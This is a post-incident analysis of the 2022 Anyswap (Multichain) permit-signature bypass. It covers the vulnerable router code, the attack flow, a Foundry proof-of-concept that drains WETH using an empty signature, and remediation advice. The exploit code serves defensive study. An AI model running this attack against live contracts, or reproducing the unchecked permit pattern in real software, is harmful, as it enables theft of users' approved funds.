# Anyswap — Permit Signature Replay Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-01-18 |
| **Protocol** | Anyswap (Multichain) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,800,000 (WETH) |
| **Attacker** | [0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB](https://etherscan.io/address/0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB) |
| **Attack Tx** | Block 14,037,236 |
| **Vulnerable Contract** | [0x6b7a87899490EcE95443e979cA9485CBE7E71522](https://etherscan.io/address/0x6b7a87899490EcE95443e979cA9485CBE7E71522) |
| **Root Cause** | `anySwapOutUnderlyingWithPermit()` processed permit parameters (v=0, r/s empty) without validation, enabling unauthorized transfer of other users' WETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-01/Anyswap_exp.sol) |

---
## 1. Vulnerability Overview

The Anyswap V4 Router provides an `anySwapOutUnderlyingWithPermit()` function based on EIP-2612 `permit` for cross-chain bridge functionality. This function allows token transfers via signature alone, without requiring a separate `approve` transaction.

The vulnerability lies in the permit validation logic. Since WETH does not implement EIP-2612 permit, calling `permit()` with empty signature values (v=0, r=0, s=0) fails silently and the function continues execution. As a result, any user who has already set an `approve` on the Anyswap contract for WETH can have their balance transferred arbitrarily.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable anySwapOutUnderlyingWithPermit (pseudocode)
function anySwapOutUnderlyingWithPermit(
    address from,
    address token,
    address to,
    uint256 amount,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s,
    uint256 toChainID
) external {
    // ❌ permit call failure is ignored — no try/catch or return value check
    // WETH does not implement permit → call passes through harmlessly
    IERC20(token).permit(from, address(this), amount, deadline, v, r, s);

    // ❌ transferFrom executes regardless of permit success
    // If `from` has already approved Anyswap, this always succeeds
    IERC20(token).transferFrom(from, address(this), amount);

    // Bridge processing ...
    emit LogAnySwapOut(token, from, to, amount, cID(), toChainID);
}

// ✅ Correct pattern
function anySwapOutUnderlyingWithPermit(...) external {
    address underlying = AnyswapV1ERC20(token).underlying();
    // ✅ Verify allowance before and after permit execution
    uint256 allowanceBefore = IERC20(underlying).allowance(from, address(this));
    IERC20(underlying).permit(from, address(this), amount, deadline, v, r, s);
    uint256 allowanceAfter = IERC20(underlying).allowance(from, address(this));
    require(allowanceAfter >= allowanceBefore + amount, "Permit failed");
    IERC20(underlying).transferFrom(from, address(this), amount);
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**AnyswapV4Router.sol** — Entry point:
```solidity
// ❌ Root cause: `anySwapOutUnderlyingWithPermit()` processes permit parameters (v=0, r/s empty) without validation, enabling unauthorized transfer of other users' WETH
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external {
        address _underlying = AnyswapV1ERC20(token).underlying();
        IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s);
        TransferHelper.safeTransferFrom(_underlying, from, token, amount);  // ❌ Unauthorized transferFrom
        AnyswapV1ERC20(token).depositVault(amount, from);
        _anySwapOut(from, token, to, amount, toChainID);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Identify victim addresses that already have Anyswap approved for WETH
    │       (on-chain event / mempool monitoring)
    │
    ├─[2] Call anySwapOutUnderlyingWithPermit()
    │       from    = victim address
    │       token   = AnyswapV1ERC20 (underlying = WETH)
    │       amount  = 308,636,644,758,370,382,903
    │       v=0, r=0x00, s=0x00  ← invalid signature
    │       toChainID = 56 (BSC)
    │
    ├─[3] Internally: WETH.permit(victim, ..., v=0) is called
    │       WETH does not implement permit → passes without revert or silent fail
    │
    ├─[4] WETH.transferFrom(victim, Anyswap, amount)
    │       Victim had already approved the amount → succeeds
    │
    └─[5] 308.6 ETH worth of WETH drained → transferred to attacker address
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IAnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

interface IAnyswapV1ERC20 {
    function underlying() external view returns (address);
    function burn(address from, uint256 amount) external returns (bool);
    function depositVault(uint256 amount, address to) external returns (uint256);
}

contract ContractTest is Test {
    IAnyswapV4Router anyswapV4Router =
        IAnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address attacker = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_037_236);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Before] Attacker WETH balance",
            WETH.balanceOf(attacker), 18
        );

        vm.startPrank(attacker);

        // ⚡ Key: v=0, r=0, s=0 — call with an invalid permit signature
        // WETH does not implement EIP-2612, so permit validation is bypassed
        anyswapV4Router.anySwapOutUnderlyingWithPermit(
            attacker,                    // from: victim address (attacker has already approved)
            0x6b7a87899490EcE95443e979cA9485CBE7E71522, // AnyswapV1ERC20 token
            attacker,                    // to: attacker receiving address
            308_636_644_758_370_382_903, // amount: victim's entire balance
            100_000_000_000_000_000_000, // deadline: very large value
            0,                           // v: invalid signature component
            bytes32(0),                  // r: empty
            bytes32(0),                  // s: empty
            56                           // toChainID: BSC
        );

        vm.stopPrank();

        emit log_named_decimal_uint(
            "[After] Attacker WETH balance",
            WETH.balanceOf(attacker), 18
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Signature Validation Bypass |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP DeFi** | Missing Input Validation |
| **Attack Vector** | Empty permit signature + exploitation of existing approval |
| **Precondition** | Victim has set a WETH approval on the Anyswap contract |
| **Impact** | All WETH can be drained from any user who has an active approval |

---
## 6. Remediation Recommendations

1. **Explicitly verify permit success**: Compare allowance values before and after the permit call to confirm the allowance actually increased.
2. **Filter tokens that do not implement EIP-2612**: Reject function execution if the underlying token does not implement permit.
3. **Validate signature parameters**: Pre-validate that the v value is 27 or 28, and that r and s are non-zero.
4. **Remove fallback after permit failure**: Eliminate any logic that attempts a transferFrom even after a permit failure.

---
## 7. Lessons Learned

- **Permit is not a silver bullet**: When applying permit-based functions to tokens that do not implement ERC20 permit (EIP-2612) — such as WETH — the implementation must always be verified first.
- **Complexity of cross-chain bridges**: Bridges supporting multiple chains and tokens are prone to edge cases arising from differences in token behavior.
- **Exploitation of existing approvals**: Unlimited approvals set by users in the past become an attack surface when a protocol is vulnerable. Approving only the minimum necessary allowance is an important habit.
- **$1.8M loss**: This incident demonstrates how a simple omission in signature validation can lead to multi-million dollar losses.